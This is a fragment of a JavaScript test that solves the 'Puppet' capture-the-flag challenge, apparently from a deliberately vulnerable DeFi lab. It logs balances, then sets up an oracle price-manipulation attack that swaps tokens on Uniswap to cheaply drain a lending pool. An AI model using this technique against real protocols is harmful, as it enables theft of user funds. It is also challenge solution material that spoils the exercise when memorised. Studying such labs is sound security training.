...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        console.log((await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("1"))).toString());
        console.log("- Attacker");
        console.log((await ethers.provider.getBalance(attacker.address)).toString());    // attacker ETH
        console.log((await this.token.balanceOf(attacker.address)).toString());  // attacker DTV
        console.log("- Lending Pool");
        console.log((await ethers.provider.getBalance(this.lendingPool.address)).toString());    // lendingPool ETH
        console.log((await this.token.balanceOf(this.lendingPool.address)).toString());  // lendingPool DTV
        console.log("- Uniswap Exchange");
        console.log((await ethers.provider.getBalance(this.uniswapExchange.address)).toString());    // exchange ETH
        console.log((await this.token.balanceOf(this.uniswapExchange.address)).toString());  // exchange DTV

        // approve for the uniswap get my tokens 
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        // swap tokens for ethereum & drop the price
        ...
        deposit = (await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)).add(1).toString();
